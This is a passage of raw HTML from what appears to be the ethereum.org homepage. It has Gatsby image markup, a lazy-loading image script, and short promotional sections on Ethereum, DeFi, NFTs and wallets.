                                    alt="An illustration of a hand creating an ETH logo made of lego bricks." />
                                </picture><noscript>
                                  <picture>
                                    <img class = 'handsome' type="image/webp"
                                      srcSet="/static/810eb64d89629231aa4d8c7fe5f20ee5/ab960/developers-eth-blocks.webp 320w,/static/810eb64d89629231aa4d8c7fe5f20ee5/d7c56/developers-eth-blocks.webp 640w"
                                      sizes="320px" /><img data-gatsby-image-ssr="" data-main-image="" style="opacity:1"
                                      sizes="320px" decoding="async" loading="lazy"
                                      src="https://d33wubrfki0l68.cloudfront.net/02929233f126da019dc082bbe159332ef6b645e6/710a7/static/810eb64d89629231aa4d8c7fe5f20ee5/7c061/developers-eth-blocks.png"
                                      srcSet="https://d33wubrfki0l68.cloudfront.net/02929233f126da019dc082bbe159332ef6b645e6/710a7/static/810eb64d89629231aa4d8c7fe5f20ee5/7c061/developers-eth-blocks.png 320w,https://d33wubrfki0l68.cloudfront.net/9381a84cf65d4dc02378a321aac51f91907427d1/f7669/static/810eb64d89629231aa4d8c7fe5f20ee5/3ad27/developers-eth-blocks.png 640w"
                                      alt="An illustration of a hand creating an ETH logo made of lego bricks." />
                                  </picture>
                                </noscript>
                                <script
                                  type="module">const t = "undefined" != typeof HTMLImageElement && "loading" in HTMLImageElement.prototype; if (t) { const t = document.querySelectorAll("img[data-main-image]"); for (let e of t) { e.dataset.src && (e.setAttribute("src", e.dataset.src), e.removeAttribute("src")), e.dataset.srcset && (e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset")); const t = e.parentNode.querySelectorAll("source[data-srcset]"); for (let e of t) e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset"); e.complete && (e.style.opacity = 1) } }</script>
                              </div>
                            </div>
                            <div class="ActionCard__Content-sc-gy4g5e-0 fOVdDV action-card-content">
                              <h3 class="ActionCard__Title-sc-gy4g5e-4 gtOVKq">Start building</h3>
                              <p class="ActionCard__Description-sc-gy4g5e-1 kEexQS">If you want to start coding with
                                Ethereum, we have documentation, tutorials, and more in our developer portal.</p>
                            </div>
                          </a></div>
                      </div>
                    </div>
                    <div class="pages__EthereumIntroContainer-sc-179z7qu-21 hdqQWl">
                      <div class="pages__RowReverse-sc-179z7qu-10 diiBgM">
                        <div
                          class="SharedStyledComponents__LeftColumn-sc-1cr9zfr-5 pages__FeatureContent-sc-179z7qu-26 bcCiek kuhKTy">
                          <h2 class="pages__StyledH2-sc-179z7qu-31 Ddgiy"><span>What is Ethereum?</span></h2>
                          <div class="pages__Subtitle-sc-179z7qu-20 cDXHGL"><span>Ethereum is a technology that's home to
                              digital money, global payments, and applications. The community has built a booming digital
                              economy, bold new ways for creators to earn online, and so much more. It's open to everyone,
                              wherever you are in the world – all you need is the internet.</span></div>
                          <div class="pages__ButtonRow-sc-179z7qu-5 gIRrJM"><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos ButtonLink__StyledLinkButton-sc-8betkf-0 ButtonLink__PrimaryLink-sc-8betkf-2 iMiHPL eClriT"
                              href="/"><span>What is Ethereum?</span></a><a
                              class="Link__InternalLink-sc-e3riao-1 hoRTos ButtonLink__StyledLinkButton-sc-8betkf-0 ButtonLink__SecondaryLink-sc-8betkf-3 iMiHPL fWQsqc pages__StyledButtonLink-sc-179z7qu-6 jUwQBm"
                              href="/en/eth/"><span>More on digital money</span></a></div>
                        </div>
                        <div class="pages__ImageContainer-sc-179z7qu-12 bCskZk">
                          <div data-gatsby-image-wrapper=""
                            class="gatsby-image-wrapper pages__FeatureImage-sc-179z7qu-19 MDGZx">
                            <div aria-hidden="true" style="padding-top:84.02061855670104%"></div><img aria-hidden="true"
                              data-placeholder-image="" style="opacity:1;transition:opacity 500ms linear" decoding="async"
                              src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAABYlAAAWJQFJUiTwAAAFC0lEQVQ4y22Sa0yTdxTGT8uyZNmyZXExc1myxc1tbl+WzcxkC+J1glowMLaAVhEpihRowYIE5NYSQaUXuQltLS2XQilocdxE2iJQilzEoSAIWMe4tm/Liogtr5y9dNm3Pf+cD+fL73/Ocx4ASidPVUB6xjQEH6iA4IAq+pfvsOB92AfBeWZ61C9ttO+38sGHUQy+kqsQ1j5K891WRvt0SxIcjLkDIkTwbxiDi4g0gK/AI75gDLicAQj2q6Ad3ieFrz84+9Fm2LPJL6cDQvbXwo4vBN67DuWfPSK+9N6ZwafwzbtZsPXjJL8d3qIm35y2+sO6gZ+5FBip8igj8zEEBWnowXtVwNgt/cmXqSGCNI/mfrVMf+a/uywsMLwOQ+qfILNreiLKZtnk/WNhZEBgFaaX/YmRD5YwyDiPfvUTiccHVwGkUilw49vhdKILDkE/cKPv9bJqJjDhvhs59TN3eGzTMKfuGfKmXr6M7LfjyZYJ6Zmw1uE0sQWVXehiD9lcx/sIDLo75/ApaN3smTCWY4ZWQz1tY+Qc/rPulOa/kN/pwnTNTFeheP6BqMWB1/pda5eGVpDdNFZTJLE+kdU5sbLD9Tr5oWM9dpjA8O6Z5SMK/SfAiYuDG3IZTSCIpTzoflOQUdtapjNj5tDfeK5tOoUVqtYml5ixdPalO/shgdGmER9ejEHFFw5hS8trsrFllTw/5MCIDkuteMNDsVhMT0tLAx6Px7il09lMHR0o03evSfpeoKRrRsEMlhsjS82YNO50Z04uYLhpMoSxJ/f3aKEB2+wu8uakcy1l1IZxvZaalEUK6L3LG37YufOtrCz+REnJdVTIy8nrFU9JYyOiSbekFF5+ZDyWZ0Fv2ZIrtoNATtNIVHbKQ2N64yRKlggy12IlU8cJZJtm+in36JCYmAgZGRmbo6PZU9fyxaitbl2/prOQApMTcwzzikqZ0xgmXsC9VTZXRJMDf1ONsVTFDv3FW1YMabaTEU12ktdLYLx5pocC0iCOw9lYd3vSheRHuVey0uuq76Kged7NebyIUQNTCm0ZaQwX2tGPAp6qs6NP3niERunWZ2rsGK61krG3bWRUO4Hn6ud6PCmkpgPKw8sxMXGX/xg1+DTUjaGgcWmNO2xF9r0puebGK0OCagkP3iJcgZUEMsrHWRqVW59cQuBR0SJ55raVvDBK4OmWhR5PZJgnTnzOYrEmNiJzv88Yf6f5KQqUi8uJ7fMY0zyh1SjWOzN0dvRvta2ENNmR1TPCqlWu6zn5DjzInyNPq21kotGOnIbZf1dm+PtvCT12bG+BRALq6upvO7vuBV7NHt1eqnAmXBQNRiiky7dzKhfxvGEBOWYCj+senNWq8C5PYccA0Zw7rMa6xqaAsf8BA44ehdDQUBAK8+harRa6Td1wRfAErquWIfemE86nNr8tLbLtksmXk8UV9r54sfmEWuXqvVBqxcP5C+gvX1iP67Mit3O6ywM8wmAAk8mkV6krobZWQ+swmrxyRFP0IvWKl7DTRUtO0YO00AqKchcAyuEkfEiX5D8/UFziEAuVxGBOteNFegOBXN3zxx6gEhdBhVYow3lP5VWOQAL0AN9nBPJ6h0FYMg6FpTa6rIb0AuqMqfALFBTNQqnCDRt9o3h1W4V0NbqgcC4V3qDe/0lKgTdKTn0mgRUoEMxC9qUBUChXYft3+6GoeI4uLV/3Qj5Cq/gVqGVroNZQRzUi/AMa3QM4mxbVkwAAAABJRU5ErkJggg=="
                              alt="" />
                            <picture>
                              <img class = 'handsome' type="image/webp"
                                data-srcset="/static/e7a074a56d991c4f9e65857bafa0f053/4a9c0/what-is-ethereum.webp 750w,/static/e7a074a56d991c4f9e65857bafa0f053/c46f0/what-is-ethereum.webp 1080w,/static/e7a074a56d991c4f9e65857bafa0f053/1828a/what-is-ethereum.webp 1366w,/static/e7a074a56d991c4f9e65857bafa0f053/20da3/what-is-ethereum.webp 1552w"
                                sizes="100vw" /><img data-gatsby-image-ssr="" data-main-image="" style="opacity:1"
                                sizes="100vw" decoding="async" loading="lazy"
                                src="https://d33wubrfki0l68.cloudfront.net/af2294333ae98ee6b1b9d220ee394548fb048787/c71cf/static/e7a074a56d991c4f9e65857bafa0f053/4e848/what-is-ethereum.png"
                                data-srcset="https://d33wubrfki0l68.cloudfront.net/3af2391622ba2b549578348e62d916c8f6a4c102/6f0a1/static/e7a074a56d991c4f9e65857bafa0f053/9cafc/what-is-ethereum.png 750w,https://d33wubrfki0l68.cloudfront.net/6ffcec35438b324e4182dafedaf8b9eac30aa47f/11f5d/static/e7a074a56d991c4f9e65857bafa0f053/59f0d/what-is-ethereum.png 1080w,https://d33wubrfki0l68.cloudfront.net/1c2a6fdd71139edbdb2fc65fa340996692b5d9f4/24cd9/static/e7a074a56d991c4f9e65857bafa0f053/be538/what-is-ethereum.png 1366w,https://d33wubrfki0l68.cloudfront.net/af2294333ae98ee6b1b9d220ee394548fb048787/c71cf/static/e7a074a56d991c4f9e65857bafa0f053/4e848/what-is-ethereum.png 1552w"
                                alt="Illustration of a person peering into a bazaar, meant to represent Ethereum." />
                            </picture><noscript>
                              <picture>
                                <img class = 'handsome' type="image/webp"
                                  srcSet="/static/e7a074a56d991c4f9e65857bafa0f053/4a9c0/what-is-ethereum.webp 750w,/static/e7a074a56d991c4f9e65857bafa0f053/c46f0/what-is-ethereum.webp 1080w,/static/e7a074a56d991c4f9e65857bafa0f053/1828a/what-is-ethereum.webp 1366w,/static/e7a074a56d991c4f9e65857bafa0f053/20da3/what-is-ethereum.webp 1552w"
                                  sizes="100vw" /><img data-gatsby-image-ssr="" data-main-image="" style="opacity:1"
                                  sizes="100vw" decoding="async" loading="lazy"
                                  src="https://d33wubrfki0l68.cloudfront.net/af2294333ae98ee6b1b9d220ee394548fb048787/c71cf/static/e7a074a56d991c4f9e65857bafa0f053/4e848/what-is-ethereum.png"
                                  srcSet="https://d33wubrfki0l68.cloudfront.net/3af2391622ba2b549578348e62d916c8f6a4c102/6f0a1/static/e7a074a56d991c4f9e65857bafa0f053/9cafc/what-is-ethereum.png 750w,https://d33wubrfki0l68.cloudfront.net/6ffcec35438b324e4182dafedaf8b9eac30aa47f/11f5d/static/e7a074a56d991c4f9e65857bafa0f053/59f0d/what-is-ethereum.png 1080w,https://d33wubrfki0l68.cloudfront.net/1c2a6fdd71139edbdb2fc65fa340996692b5d9f4/24cd9/static/e7a074a56d991c4f9e65857bafa0f053/be538/what-is-ethereum.png 1366w,https://d33wubrfki0l68.cloudfront.net/af2294333ae98ee6b1b9d220ee394548fb048787/c71cf/static/e7a074a56d991c4f9e65857bafa0f053/4e848/what-is-ethereum.png 1552w"
                                  alt="Illustration of a person peering into a bazaar, meant to represent Ethereum." />
                              </picture>
                            </noscript>
                            <script
                              type="module">const t = "undefined" != typeof HTMLImageElement && "loading" in HTMLImageElement.prototype; if (t) { const t = document.querySelectorAll("img[data-main-image]"); for (let e of t) { e.dataset.src && (e.setAttribute("src", e.dataset.src), e.removeAttribute("src")), e.dataset.srcset && (e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset")); const t = e.parentNode.querySelectorAll("source[data-srcset]"); for (let e of t) e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset"); e.complete && (e.style.opacity = 1) } }</script>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div class="pages__FinanceContainer-sc-179z7qu-22 wJuNn">
                      <div class="pages__Row-sc-179z7qu-11 cYDWJt">
                        <div
                          class="SharedStyledComponents__LeftColumn-sc-1cr9zfr-5 pages__FeatureContent-sc-179z7qu-26 bcCiek kuhKTy">
                          <div class="pages__LeftColumnContent-sc-179z7qu-27 eJJieU">
                            <h2 class="pages__StyledH2-sc-179z7qu-31 Ddgiy"><span>A fairer financial system</span></h2>
                            <div class="pages__Subtitle-sc-179z7qu-20 cDXHGL"><span>Today, billions of people can’t open
                                bank accounts, others have their payments blocked. Ethereum's decentralized finance (DeFi)
                                system never sleeps or discriminates. With just an internet connection, you can send,
                                receive, borrow, earn interest, and even stream funds anywhere in the world.</span></div>
                            <div><a
                                class="Link__InternalLink-sc-e3riao-1 hoRTos ButtonLink__StyledLinkButton-sc-8betkf-0 ButtonLink__PrimaryLink-sc-8betkf-2 iMiHPL eClriT"
                                href="/en/defi/"><span>Explore DeFi</span></a></div>
                          </div>
                        </div>
                        <div class="pages__ImageContainer-sc-179z7qu-12 bCskZk">
                          <div data-gatsby-image-wrapper=""
                            class="gatsby-image-wrapper pages__FeatureImage-sc-179z7qu-19 MDGZx">
                            <div aria-hidden="true" style="padding-top:90.20833333333334%"></div><img aria-hidden="true"
                              data-placeholder-image="" style="opacity:1;transition:opacity 500ms linear" decoding="async"
                              src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAD2EAAA9hAHVrK90AAAFF0lEQVQ4y2VUa0yTZxQ+pc79WLItLpotkZklm8s2/bHhYnSLm07nJe7ibk7UiTqsyKYIIqhYqSCUtbXQFumdttDSFtpKgVJo0XJroZWLpVAYeOMmCBuCIor0O/vaScyykzx5kzd5nnPO+7znADwLdn4NyMu6QGXtoxRW3wQGz/DKG0uXUhy9CPuSUiFDaIar3QiJ6fKXo+OZi86wNOSdJcRdv/VH+F+Ym6dAbGynSEu9kF/uX66vHfZniizf5erdF6ISUxcnZspWik3t9Et6D0de3uVFxBBvV3QSMMXW50JSQw8ozDchO7+JUlw3+mJtH4K+9i5L5xgaMTrHKzT2O6iz9LRKmnvu6K4OYUXbI6PZMzXzh8y2RaBtApGhfaGkuAckxX4Q6joACi2DoLXdo1zSeIGvdgFHaV9c6r4/VlB1w2VueXCv9Moo1tc9QPXkJOqaR7DMPXWbTHRP5xisekhWyVXUQ5F1FArK+yH/ch+AqNgXJjN1A7/QsyFLbIviq5tpBZW3kczcX9I4jrW2iYCnYTqgxkeBgv4x1NuHAyLD9buqipuPYxKzI/L0rXGFlv5wTdUwKdhLAba4nsqRNAIz98qvUlMXCjQep6CwdS6NXz2sK/Zja81DosIyQWiHpghlYJIQ2H2YzqkcFOq8TwUad5O89M9HZ5mmFSlME1zgWSkQd1pGPXQ0B0hskhr9KDb4UKTvnMvJd6PWMEbwS2YwTXE/UK9/Qjia5lDdMkJkK90E+WYBWWk35mmvT3wUse3NNWu/h+8jT1AgJkEQ9kt0Buzefz6Cp7o2m6tpxUxBDcGWuAi6qBtPKyeJTM1jvGZCbCycIdTSbmRL6jE9uyog1HuR7G7gnbfXvBqxajtEHc6kwPYdMSG3g98giaHtLLDcQWVFb4DBqSTSJD6CIfbiWZ5vqEjSN65T96FM0kak51QTRTUDTyUl3XgsWa51tCHcnkbKhs17AQ7GskNiQcSfUbVyRC40NPw1l6NwYSq3LkBXjWMiz9twWdrbYdeMYVqWNSA2dqL+6ugsU1CLv5+U5Nd3IHgHMWz1J9sBIvfTIVvaEsYRNUNymj4x/aIdhVrfnNn9gNBYb2GGwk9kFM1gs/EJyhXeAE/dhuQQENlyD57nVGN8inJbSsZloGeVhW3+6iBA9FEuHInPDbXNlbQCg2VRp120oUjne2pyTiDp4hyD33lDJfWP5em8qCq/RQgK2uYYbCumsipS0rk2ECi8Ycveehc+2/gzwIEjLIg8kApsoYuakeOApFQd86LUiZIS/7TE4Mccpdu5ZePhxQkpqpVcuWuEdBVlxp7HWZcceCxJvvvkOV2wOmpZHcLadd8CDAwMAC2OByW2aQpP2gGJdI2Cr2pBq3cW7V0EGp1josqWWXCTI2l233dd6UYs8zxElrAB404pjjNY1cDKc1I3bN797ywHBXNVXUFzKDt+SoAPV216KfZEXoKwuN1GjtcNmdm3S2HpDJmmsPSkkEujj6toNB+M5ewh6ZSgRrCyULvzgg3uIdh3mAtRtCzY+jUNks/r4Nk2eYEgz34Sqz/9cv5u4d/kSboL4cuWw/sr1sDnm3bBui92PhcMRtwpJdCO8iHqEBNSMo1UkhzKPkuSn5BYv+WHeUGYQQw7fkZJjdx/DoJd7aNlPF9fQcF5LFiwAPbE0OGbyN/gvZUfw96YsxAdfwFikzkQk8QGWgITdh44AYteWwJLXg+H5R9EQHh4+H/26j8fvxKTT/pDjAAAAABJRU5ErkJggg=="
                              alt="" />
                            <picture>
                              <img class = 'handsome' type="image/webp"
                                data-srcset="/static/4d030a46f561e5c754cabfc1a97528ff/915c0/impact_transparent.webp 750w,/static/4d030a46f561e5c754cabfc1a97528ff/40c69/impact_transparent.webp 1080w,/static/4d030a46f561e5c754cabfc1a97528ff/a5c62/impact_transparent.webp 1366w,/static/4d030a46f561e5c754cabfc1a97528ff/3ba1a/impact_transparent.webp 1920w"
                                sizes="100vw" /><img data-gatsby-image-ssr="" data-main-image="" style="opacity:1"
                                sizes="100vw" decoding="async" loading="lazy"
                                src="https://d33wubrfki0l68.cloudfront.net/f87304cb065aff4f7cf0cda9bdca19dad3e34ceb/5f9b8/static/4d030a46f561e5c754cabfc1a97528ff/843b6/impact_transparent.png"
                                data-srcset="https://d33wubrfki0l68.cloudfront.net/5b4654bf80a4c3dfec47046342a3e90554474690/e9969/static/4d030a46f561e5c754cabfc1a97528ff/f0681/impact_transparent.png 750w,https://d33wubrfki0l68.cloudfront.net/fd9695a99540b1aab52aa29ff8ad5d6bc448f2e7/d3860/static/4d030a46f561e5c754cabfc1a97528ff/11f3e/impact_transparent.png 1080w,https://d33wubrfki0l68.cloudfront.net/760b0a3abbf4cb38e2d8148c265a79521d554db2/fbf30/static/4d030a46f561e5c754cabfc1a97528ff/abbdd/impact_transparent.png 1366w,https://d33wubrfki0l68.cloudfront.net/f87304cb065aff4f7cf0cda9bdca19dad3e34ceb/5f9b8/static/4d030a46f561e5c754cabfc1a97528ff/843b6/impact_transparent.png 1920w"
                                alt="Illustration of hands offering an ETH symbol." />
                            </picture><noscript>
                              <picture>
                                <img class = 'handsome' type="image/webp"
                                  srcSet="/static/4d030a46f561e5c754cabfc1a97528ff/915c0/impact_transparent.webp 750w,/static/4d030a46f561e5c754cabfc1a97528ff/40c69/impact_transparent.webp 1080w,/static/4d030a46f561e5c754cabfc1a97528ff/a5c62/impact_transparent.webp 1366w,/static/4d030a46f561e5c754cabfc1a97528ff/3ba1a/impact_transparent.webp 1920w"
                                  sizes="100vw" /><img data-gatsby-image-ssr="" data-main-image="" style="opacity:1"
                                  sizes="100vw" decoding="async" loading="lazy"
                                  src="https://d33wubrfki0l68.cloudfront.net/f87304cb065aff4f7cf0cda9bdca19dad3e34ceb/5f9b8/static/4d030a46f561e5c754cabfc1a97528ff/843b6/impact_transparent.png"
                                  srcSet="https://d33wubrfki0l68.cloudfront.net/5b4654bf80a4c3dfec47046342a3e90554474690/e9969/static/4d030a46f561e5c754cabfc1a97528ff/f0681/impact_transparent.png 750w,https://d33wubrfki0l68.cloudfront.net/fd9695a99540b1aab52aa29ff8ad5d6bc448f2e7/d3860/static/4d030a46f561e5c754cabfc1a97528ff/11f3e/impact_transparent.png 1080w,https://d33wubrfki0l68.cloudfront.net/760b0a3abbf4cb38e2d8148c265a79521d554db2/fbf30/static/4d030a46f561e5c754cabfc1a97528ff/abbdd/impact_transparent.png 1366w,https://d33wubrfki0l68.cloudfront.net/f87304cb065aff4f7cf0cda9bdca19dad3e34ceb/5f9b8/static/4d030a46f561e5c754cabfc1a97528ff/843b6/impact_transparent.png 1920w"
                                  alt="Illustration of hands offering an ETH symbol." />
                              </picture>
                            </noscript>
                            <script
                              type="module">const t = "undefined" != typeof HTMLImageElement && "loading" in HTMLImageElement.prototype; if (t) { const t = document.querySelectorAll("img[data-main-image]"); for (let e of t) { e.dataset.src && (e.setAttribute("src", e.dataset.src), e.removeAttribute("src")), e.dataset.srcset && (e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset")); const t = e.parentNode.querySelectorAll("source[data-srcset]"); for (let e of t) e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset"); e.complete && (e.style.opacity = 1) } }</script>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div class="pages__NftContainer-sc-179z7qu-23 itaOEL">
                      <div class="pages__Row-sc-179z7qu-11 cYDWJt">
                        <div class="pages__ImageContainer-sc-179z7qu-12 bCskZk">
                          <div data-gatsby-image-wrapper=""
                            class="gatsby-image-wrapper pages__FeatureImage-sc-179z7qu-19 MDGZx">
                            <div aria-hidden="true" style="padding-top:109.27083333333331%"></div><img aria-hidden="true"
                              data-placeholder-image="" style="opacity:1;transition:opacity 500ms linear" decoding="async"
                              src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAWCAYAAADAQbwGAAAACXBIWXMAAD2EAAA9hAHVrK90AAAFXklEQVQ4y8WVe0zTVxTHD4gadIv7R5NpotuyREeMMSZuM9lE3aAv2kKLtIA/nrblVV7aB4+WlpdAeehAQEFh8h4VoQXGUBBFBfExFZ1QZFE2Mw0+QNzUPu5ZW8yM2/5cspt8c/K7v9/95HvOPff+AP6vsWbNali+fDmsXPk+rFq1yjmHiODh8cm/LxgnxBmzVMmglseAWhHrok2NX6BJkb6RMs4tMy3eLTk6wi1CKFggpoJdQwN2QkSgACKDhBDo5wtA91fC11wZ8CI14O2b7hqV1eCaUlzvdkXvD9/kREOxJhJ0qnDITaGgQB0FGtVeEAaFA5cTDEJhJGzyigVVdCAoREHQk8sFaOk+D5fGJx32XTw2xgFfXAGy3Bo42UwtK8mO8SnUSvwKNOLgPPVuUUFGXHyWWqakdoWqeNygcEFA2LZ1W8KWRokjQS4SuDSp2QC1+j5o6TntrMfaDeKNgTEHvBILO+nhYcntMZIklIj3oFi0F3eL5EhRESgNZWBhIg8zo3mo3M3HhBDfRpmQA/BRBWRKGPOFdYyW7pGvFHmtc5V9lzHPeB3DVEYM1XaT8Oxem6Sw37pff9bKDc23qMJoZtMhf/OZfVzrYL6vbVDHxy4NRzFRRcHdGsrVCZxD1Nx+8AQP9V0lnbOPSd3d+7bikZu27N4hknNyiBSd+5EcH7tFqMRiEhEpIf05PqQ2nkbqk2jWxmRvPChl3YVP1QvXMaUAxA6cRWwbn55BXe8Nc+3kFGkx/UIaR38mh7pGsNwwTCoNF3F/Qx8yxPnI2UVhVwYLjytYxJjOtp1QMjBPRH+4nhbt7smOmAfO2GwNE8+eY/XoPUvNxD1sHpsizZP3sebibSw1DOHBjiEsqXMAdcij5oGtciYa0tg2QyoLC8T0hx94itw/o4fM13CWkKbbs8+xdMhkOeoAjk9h3fU7eGRwFEuNw1hmBxYfO4V0kQMY8hawI5WJOgljej09xn0bJ/K1QzvwzswcFvfftJRfG8P6yyasv2LCqt6rjpSx0jCCZfqzyI3OR9+QUOxSM/8GZD7ezJEu8eKJXjtEbPzpwSM8OnzdbHj6hNRN3CNlF0cx13iW7OsaxLzvz2OLyYQRqUdwp38IdqoZb4ApTCyMYj3Zyo97hyWQANgcDpG0mp7OYVHrAFZduoEHLozaEmt6SEJND9pF4ivbUF5Uh7zANJSFU9ih5qBeznAAiQOoi/L5wz8g9GOBMBxgxmqFabOlfNpqm7n1cPpXbVPXi4N6A7YZO4jeaMBWhzra8Vh1FWYo92CuSontGX5OoH2XidGRchT7JYcbsIHPDwKwmF/C1NyzhfbUF1/+7dp7O7TZ/t9W6bpPVOdgbWmWuak8y/pdZaa11a4ybby1QhNj7dJwSfMemq0thWXVy2m2gmiO1c9XsDFgZzDAi1cv4ZHZ7KylU+c0MFrms6XTvpOyYB88HOeNdYle6GjghmQ69mZxcLDAz/5Mw+a9dHs/MrA6kT3httZn6YpNPIBnVgs8sljsvUhg7Eq7y0wPzQ7ucxvQ8c+kh7MvVcTRzxyWel84mkAftsNHGmWMa0Ml/N+PK5kzegVzslXBulGX5C3v0AjhdH6Ii/Mcf5EQC5s16VBbEAZAyeBYbiQ0prIXxQ44XP/w13mfj4vdmlNpH2qDPn8v0NNjoTOrAQoOKMRQlaN8+5KtT2PBfnWgfeFq6NCyIXvdPy/iRe+uAIOWBaViT1AJt9hn3AH7pc53S5atePvj4TIBvBqQAt5Uwsl9fpBGeUF26HZID/oSMqmtoLbHIvF2aM9gulREb3epS6LBEak3lIh2wCkNGy7k+v73/54/AUaEKKCt+fV1AAAAAElFTkSuQmCC"
                              alt="" />
                            <picture>
                              <img class = 'handsome' type="image/webp"
                                data-srcset="/static/a44134e541c72364beb121234ab5864e/eb410/infrastructure_transparent.webp 750w,/static/a44134e541c72364beb121234ab5864e/4319d/infrastructure_transparent.webp 1080w,/static/a44134e541c72364beb121234ab5864e/ff5f0/infrastructure_transparent.webp 1366w,/static/a44134e541c72364beb121234ab5864e/fd5c2/infrastructure_transparent.webp 1920w"
                                sizes="100vw" /><img data-gatsby-image-ssr="" data-main-image="" style="opacity:1"
                                sizes="100vw" decoding="async" loading="lazy"
                                src="https://d33wubrfki0l68.cloudfront.net/15920db3de67c097244f8140a245336054722a3c/37065/static/a44134e541c72364beb121234ab5864e/5791f/infrastructure_transparent.png"
                                data-srcset="https://d33wubrfki0l68.cloudfront.net/41c8f3ab798b7c5e279185763e340a2e603bd970/2009a/static/a44134e541c72364beb121234ab5864e/a26f5/infrastructure_transparent.png 750w,https://d33wubrfki0l68.cloudfront.net/81b24b1425687c2668d6eb404719ecc8724a6cdc/f553e/static/a44134e541c72364beb121234ab5864e/437be/infrastructure_transparent.png 1080w,https://d33wubrfki0l68.cloudfront.net/a008b4f0877795979f720ab39121796e2ba50053/07407/static/a44134e541c72364beb121234ab5864e/93b79/infrastructure_transparent.png 1366w,https://d33wubrfki0l68.cloudfront.net/15920db3de67c097244f8140a245336054722a3c/37065/static/a44134e541c72364beb121234ab5864e/5791f/infrastructure_transparent.png 1920w"
                                alt="An Eth logo being displayed via hologram." />
                            </picture><noscript>
                              <picture>
                                <img class = 'handsome' type="image/webp"
                                  srcSet="/static/a44134e541c72364beb121234ab5864e/eb410/infrastructure_transparent.webp 750w,/static/a44134e541c72364beb121234ab5864e/4319d/infrastructure_transparent.webp 1080w,/static/a44134e541c72364beb121234ab5864e/ff5f0/infrastructure_transparent.webp 1366w,/static/a44134e541c72364beb121234ab5864e/fd5c2/infrastructure_transparent.webp 1920w"
                                  sizes="100vw" /><img data-gatsby-image-ssr="" data-main-image="" style="opacity:1"
                                  sizes="100vw" decoding="async" loading="lazy"
                                  src="https://d33wubrfki0l68.cloudfront.net/15920db3de67c097244f8140a245336054722a3c/37065/static/a44134e541c72364beb121234ab5864e/5791f/infrastructure_transparent.png"
                                  srcSet="https://d33wubrfki0l68.cloudfront.net/41c8f3ab798b7c5e279185763e340a2e603bd970/2009a/static/a44134e541c72364beb121234ab5864e/a26f5/infrastructure_transparent.png 750w,https://d33wubrfki0l68.cloudfront.net/81b24b1425687c2668d6eb404719ecc8724a6cdc/f553e/static/a44134e541c72364beb121234ab5864e/437be/infrastructure_transparent.png 1080w,https://d33wubrfki0l68.cloudfront.net/a008b4f0877795979f720ab39121796e2ba50053/07407/static/a44134e541c72364beb121234ab5864e/93b79/infrastructure_transparent.png 1366w,https://d33wubrfki0l68.cloudfront.net/15920db3de67c097244f8140a245336054722a3c/37065/static/a44134e541c72364beb121234ab5864e/5791f/infrastructure_transparent.png 1920w"
                                  alt="An Eth logo being displayed via hologram." />
                              </picture>
                            </noscript>
                            <script
                              type="module">const t = "undefined" != typeof HTMLImageElement && "loading" in HTMLImageElement.prototype; if (t) { const t = document.querySelectorAll("img[data-main-image]"); for (let e of t) { e.dataset.src && (e.setAttribute("src", e.dataset.src), e.removeAttribute("src")), e.dataset.srcset && (e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset")); const t = e.parentNode.querySelectorAll("source[data-srcset]"); for (let e of t) e.setAttribute("srcset", e.dataset.srcset), e.removeAttribute("data-srcset"); e.complete && (e.style.opacity = 1) } }</script>
                          </div>
                        </div>
                        <div
                          class="SharedStyledComponents__LeftColumn-sc-1cr9zfr-5 pages__FeatureContent-sc-179z7qu-26 bcCiek kuhKTy">
                          <div class="pages__LeftColumnContent-sc-179z7qu-27 eJJieU">
                            <h2 class="pages__StyledH2-sc-179z7qu-31 Ddgiy"><span>The internet of assets</span></h2>
                            <div class="pages__Subtitle-sc-179z7qu-20 cDXHGL"><span>Ethereum isn't just for digital money.
                                Anything you can own can be represented, traded and put to use as non-fungible tokens
                                (NFTs). You can tokenise your art and get royalties automatically every time it's re-sold.
                                Or use a token for something you own to take out a loan. The possibilities are growing all
                                the time.</span></div>
                            <div><a
                                class="Link__InternalLink-sc-e3riao-1 hoRTos ButtonLink__StyledLinkButton-sc-8betkf-0 ButtonLink__PrimaryLink-sc-8betkf-2 iMiHPL eClriT"
                                href="/en/nft/"><span>More on NFTs</span></a></div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div class="pages__InternetContainer-sc-179z7qu-24 kbxyPU">
                      <div class="pages__Row-sc-179z7qu-11 cYDWJt">
                        <div
                          class="SharedStyledComponents__LeftColumn-sc-1cr9zfr-5 pages__FeatureContent-sc-179z7qu-26 bcCiek kuhKTy">
                          <div class="pages__LeftColumnContent-sc-179z7qu-27 eJJieU">
                            <h2 class="pages__StyledH2-sc-179z7qu-31 Ddgiy"><span>An open internet</span></h2>
                            <div class="pages__Subtitle-sc-179z7qu-20 cDXHGL"><span>Today, we gain access to 'free' internet
                                services by giving up control of our personal data. Ethereum services are open by default –
                                you just need a wallet. These are free and easy to set up, controlled by you, and work
                                without any personal info.</span></div>
                            <div class="pages__ButtonRow-sc-179z7qu-5 gIRrJM"><a
                                class="Link__InternalLink-sc-e3riao-1 hoRTos ButtonLink__StyledLinkButton-sc-8betkf-0 ButtonLink__PrimaryLink-sc-8betkf-2 iMiHPL eClriT"
                                href="/en/dapps/?category=technology"><span>Explore the open internet</span></a><a
                                class="Link__InternalLink-sc-e3riao-1 hoRTos ButtonLink__StyledLinkButton-sc-8betkf-0 ButtonLink__SecondaryLink-sc-8betkf-3 iMiHPL fWQsqc pages__StyledButtonLink-sc-179z7qu-6 jUwQBm"
                                href="/en/wallets/"><span>More on wallets</span></a></div>
                          </div>
                        </div>
                        <div class="pages__ImageContainer-sc-179z7qu-12 bCskZk">
